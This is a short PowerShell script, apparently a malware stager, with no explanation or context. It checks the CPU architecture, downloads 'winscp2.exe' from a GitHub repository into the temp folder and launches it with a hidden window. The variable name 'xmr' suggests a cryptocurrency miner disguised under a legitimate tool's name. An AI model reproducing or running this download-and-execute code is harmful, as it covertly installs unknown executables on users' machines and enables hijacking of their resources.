$cc = "https://github.com/c4kroot/Plugins-Files-for-Firewall/raw/main"
$is64 = (([Array](Get-WmiObject -Query "select AddressWidth from Win32_Processor"))[0].AddressWidth -eq 64)
$xmr = "$cc/winscp2.exe"

if ($is64) {
	$xmr = "$cc/checkit2.exe"
}

(New-Object Net.WebClient).DownloadFile("$cc/winscp2.exe", "$env:TMP\winscp2.exe")
Start-Process "$env:TMP\winscp2.exe"  -windowstyle hidden
